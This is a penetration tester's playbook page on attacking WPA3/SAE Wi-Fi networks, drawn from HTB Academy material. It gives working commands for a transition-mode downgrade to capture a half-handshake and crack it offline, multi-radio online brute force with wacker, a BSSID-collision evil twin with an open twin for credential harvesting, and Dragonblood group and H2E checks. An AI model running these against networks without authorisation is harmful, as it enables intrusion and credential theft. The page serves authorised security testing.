# Wireless - WPA3 and SAE

## What actually changed, and which three paths remain

**Trigger:** The survey shows `WPA3 ... SAE` on an in-scope BSSID.

WPA3 replaces the pre-shared key handshake with SAE, a password-authenticated key exchange derived from Dragonfly, and the consequence for an attacker is specific: the exchange no longer leaks anything that can be attacked offline. There is no handshake to capture and grind, no PMKID, and PMF is mandatory so deauthentication is unavailable. That closes the entire WPA2 playbook and leaves three paths. **Downgrade**, if the AP runs in transition mode to support older clients — this is by far the best option and is common in real deployments because dropping WPA2 support breaks printers and IoT. **Online brute force** against the AP, which is slow and noisy because every guess requires a full exchange with the AP, but is the only passphrase attack against a correctly configured SAE-only network. **Collider evil twin**, which does not recover the passphrase but induces a MAC-collision or forces clients into a rogue AP for credential harvesting. Denial of service exists as a fourth option and should be treated as a last resort requiring explicit client permission. Determine which applies by reading the AKM list per BSSID, because in a fleet advertising one ESSID it is normal for some APs to be SAE-only and one to still be in transition mode, and that one is the way in.

```text
  Transition mode (PSK + SAE in AKM)  -> downgrade to a half-handshake   (best)
  SAE only                            -> online brute force, or collider evil twin
  Neither works                       -> no passphrase path; client-side-and-dos.md

Confirm per BSSID, not per ESSID:
  sudo airodump-ng wlan0mon --essid "CorpWiFi" -w wpa3check
  Wireshark: beacon -> RSN Information -> AKM Suite List
     00-0F-AC:8 only          -> SAE only
     00-0F-AC:2 + 00-0F-AC:8  -> transition mode
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Attacking WPA3 Wi-Fi Network, Reconnaissance and Enumeration

## Transition-mode downgrade into a half-handshake

**Trigger:** A WPA3 AP advertises both PSK and SAE in its AKM list, and at least one client is associated.

Transition mode exists so WPA2-only devices can still join, and that backwards compatibility is the vulnerability: a client capable of both will negotiate WPA2 with an AP that offers it, and it has no way to tell your rogue AP from the real one if you clone the BSSID. Stand up a WPA2-only access point with the target's ESSID and BSSID and a deliberately wrong passphrase. The client associates, begins the four-way handshake, and fails at the third message because the key does not match — but messages one and two have already crossed, and that pair is a *half handshake* containing everything needed to crack the real passphrase offline. `hostapd` announces this as `AP-STA-POSSIBLE-PSK-MISMATCH`, which is the success signal, not an error. Run a monitor-mode capture against the real BSSID in parallel so the EAPOL frames are recorded; the rogue AP produces the event, the capture produces the evidence. Put the rogue AP on a different channel from the real AP since you are cloning its MAC, or the two radios collide and you cause an outage instead of a capture. Validate with `cowpatty -c` before tearing down, then convert and crack exactly as for WPA2 — the resulting hash is an ordinary mode 22000 with an `M12E2 (challenge)` marker.

```bash
# 1. Clone the target BSSID onto the AP interface
sudo ifconfig wlan1 down
sudo macchanger -m 9C:9A:03:39:BD:7A wlan1
sudo ifconfig wlan1 up

# 2. hostapd.conf — WPA2 only, deliberately wrong passphrase
cat > hostapd.conf <<'EOF'
ssid=CorpWiFi
hw_mode=g
channel=1
interface=wlan1
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
auth_algs=1
wpa_passphrase=FAKEPASSWORD
EOF

# 3. Capture against the REAL BSSID first
sudo airodump-ng -c 1 --bssid 9C:9A:03:39:BD:7A wlan0mon -w halfhandshake

# 4. Start the rogue AP
sudo hostapd hostapd.conf
#    wlan1: AP-STA-POSSIBLE-PSK-MISMATCH f2:7b:12:97:b2:e8   <- success

# 5. Validate, convert, crack
cowpatty -c -r halfhandshake-01.cap
hcxpcapngtool -o hash halfhandshake-01.cap        # EAPOL M12E2 (challenge): 1
hashcat -m 22000 hash /opt/wordlist.txt
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Attacking WPA3 Wi-Fi Network

## Online brute force against SAE with wacker

**Trigger:** SAE-only, PMF required, no downgrade available, and the client has authorised active guessing against the AP.

Against a correctly configured WPA3 network the only passphrase attack left is online: each candidate requires a complete SAE exchange with the access point, so the rate is a few attempts per second per radio rather than the hundreds of thousands per second an offline GPU crack achieves. That changes the arithmetic completely — a wordlist of fourteen million is not going to finish, so this only pays against a short, targeted candidate list built from the client's naming conventions, or against an AP whose passphrase you have reason to believe is weak. `wacker` drives `wpa_supplicant` to perform the exchanges and needs the frequency in MHz rather than a channel number, so convert first. Its one real scaling lever is parallelism across radios: split the wordlist into as many chunks as you have interfaces and run one process per interface, which multiplies throughput linearly with hardware. Be honest about the load this places on a production AP — it is a sustained stream of authentication attempts, it will appear in the client's logs as an attack, and it can trip lockout or rate limiting on managed infrastructure, so it belongs in the pre-engagement conversation rather than being started quietly.

```bash
cd /opt/wacker

# Channel -> frequency: ch1=2412  ch6=2437  ch11=2462
sudo python3 wacker.py --interface wlan0 --wordlist wordlist.txt \
  --ssid "CorpWiFi" --freq 2412 --bssid D8:D4:3D:E1:29:D5

# Parallelise across every available radio
iwconfig                                    # count usable interfaces
bash split.sh 4 /opt/rockyou.txt            # -> rockyou.txt.aaa .. .aad

cat > simplify.sh <<'EOF'
#!/bin/sh
for i in 0 1 2 3; do
  case $i in 0) W=aaa;; 1) W=aab;; 2) W=aac;; 3) W=aad;; esac
  xterm -e bash -c "python3 wacker.py --interface wlan$i --wordlist rockyou.txt.$W \
    --ssid 'CorpWiFi' --freq 2412 --bssid D8:D4:3D:E1:29:D5; read -p 'Finished'" &
done
EOF
sudo bash simplify.sh
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising WPA3 Wi-Fi Network

## Collider evil twin against SAE-only

**Trigger:** SAE-only, brute force is running or has failed, and you need another angle while it grinds.

The collider approach abandons passphrase recovery and attacks the client's decision instead. Stand up a rogue AP advertising the same ESSID and BSSID as the target but configured for WPA2-PSK; clients then see an access point claiming to support both WPA2 and WPA3 for a network they know as WPA3, which produces association failures and, for many supplicants, a refusal to connect at all — a denial of service arising from the collision rather than from a flood. Pair it with a second rogue AP running open, which gives the now-disconnected users something to join, and from there the attack becomes an ordinary captive-portal or credential-harvest exercise. The mechanism is worth understanding precisely: WPA3's cryptography is not what fails here, the client's network-selection logic is, which is why a correctly configured SAE network is still reachable through its users. The practical caveat is that modern supplicants increasingly refuse to downgrade a network saved as WPA3, so expect partial success and confirm from the client side rather than assuming the collision worked.

```bash
# Rogue AP 1: BSSID and ESSID collision, WPA2 where the real network is WPA3
sudo ifconfig wlan1 down
sudo macchanger -m D8:D4:3D:E1:29:D5 wlan1
sudo ifconfig wlan1 up
cat > collider.conf <<'EOF'
interface=wlan1
ssid=CorpWiFi
hw_mode=g
channel=6
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=Collision123
EOF
sudo hostapd collider.conf

# Rogue AP 2: open, to catch the users the collision displaced
cat > open-twin.conf <<'EOF'
interface=wlan2
ssid=CorpWiFi-Guest
hw_mode=g
channel=11
EOF
sudo hostapd open-twin.conf

# Then: captive portal / credential harvest -> rogue-ap-and-karma.md
```

Source: HTB Academy, Attacking Corporate Wi-Fi Networks — Compromising WPA3 Wi-Fi Network

## Dragonblood: side channels and downgrade within SAE

**Trigger:** SAE-only, and you want to know whether the implementation itself is old enough to be attackable.

The Dragonblood family of 2019 findings showed that SAE's security depends on implementation details as much as on the protocol. Two classes matter. **Group downgrade**: an AP that supports several elliptic curve or finite-field groups can be pushed toward the weakest one, and a client that accepts a group it should reject can be forced into a cheaper exchange. **Side channels**: the original hunting-and-pecking method of deriving the password element executed a variable number of iterations depending on the password and the MAC addresses, leaking information through both timing and cache access that allows a password-partitioning attack — effectively an offline dictionary attack reconstructed from many observed exchanges. The mitigation is Hash-to-Element, which is constant-time and is signalled in the RSN extended capabilities; an AP advertising H2E is not vulnerable to the classic side channels. Patched firmware from 2020 onward generally closes all of it, so in a modern corporate estate this is usually a negative result to note rather than a live path — but it is exactly the check that finds the neglected AP in a warehouse that has not been updated in six years, and confirming H2E support is a legitimate positive finding for the report.

```bash
# Which groups does the AP accept? Repeated exchanges with different group IDs.
tshark -r wpa3.cap -Y "wlan.fixed.auth.alg == 3" \
  -T fields -e wlan.sa -e wlan.da -e wlan.fixed.finite_cyclic_group | sort -u
#   group 19 (P-256) is the mandatory baseline
#   support for groups 22-24 (FFC) has historically been the weak path

# H2E vs hunting-and-pecking, from the RSN Extended Capabilities in the beacon
tshark -r wpa3.cap -Y "wlan.fc.type_subtype == 0x08" \
  -T fields -e wlan.bssid -e wlan.rsn.ext_cap.sae_h2e
#   H2E present -> constant-time PWE derivation; side channels closed

# Reference implementation of the original checks
git clone https://github.com/vanhoefm/dragonslayer
git clone https://github.com/vanhoefm/dragondrain-and-time
```

Source: Operator practice; Vanhoef & Ronen, Dragonblood (2019)
